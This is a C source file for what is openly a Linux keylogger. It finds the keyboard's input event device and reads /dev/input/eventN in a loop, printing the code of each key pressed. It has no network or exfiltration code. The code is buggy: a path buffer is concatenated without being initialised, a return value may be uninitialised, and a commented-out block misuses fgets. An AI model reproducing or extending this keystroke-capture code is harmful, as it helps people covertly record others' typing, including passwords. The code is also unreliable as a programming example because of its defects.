#include "keylogger.h"
#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>

char get_event_num(){

    const char *key_word = "keyboard";
    const char *event_word= "event";
    const int event_len = strlen(event_word);
    char num_event;
    char *t_temp;

    FILE* fp;
    char buffer_line[BUFF_LINE];
    char buffer_chunk[BUFF_CHUNK]="";

    fp = fopen(GET_EVENT_PATH, "rb");
    
    if (fp == NULL)
        return -1;

while(fgets(buffer_line, BUFF_LINE, fp)) {
    if(buffer_line[0] == '\0' || buffer_line[0]== '\n'){

        if (strstr(buffer_chunk, key_word) != NULL) {
            if(strstr(buffer_chunk,event_word) !=NULL){
                t_temp= strstr(buffer_chunk, event_word);
                num_event = buffer_chunk[(int)(t_temp - buffer_chunk) + event_len ];
                }
        
        }

        memset(buffer_chunk,0,strlen(buffer_chunk));
        }
        

    strcat(buffer_chunk, buffer_line);
    }

    fclose(fp);

    return num_event;

}

int capture_keys(char *event_num){
    

    char event_final_path[BUFF_LINE];
    
    strcat(event_final_path, EVENT_PATH);
    strcat(event_final_path, event_num);
    struct input_event ev;
    printf("%s", event_final_path);

    int fp = open((const char *)event_final_path, O_RDONLY);
    int size = sizeof (struct input_event);

    //signal(SIGINT, sa_handler);

while (1){
    read(fp, &ev, size);
        if(ev.type == 1 && ev.value == 1){
            printf("Key: %i State: %i\n",ev.code,ev.value);
        }
    sleep(1);
}








    /*
    fp =  fopen(event_final_path, "rb");

    if(fp == NULL){
        printf("errrr");
        return -1;
    }

        while(1){
            fgets((void *) &ev, sizeof(struct input_event), fp);
printf("2");
            if(ev.type == 1)
                printf("key %i state %i\n", ev.code, ev.value);
printf("3");
        }
        
*/
        return 0;
}
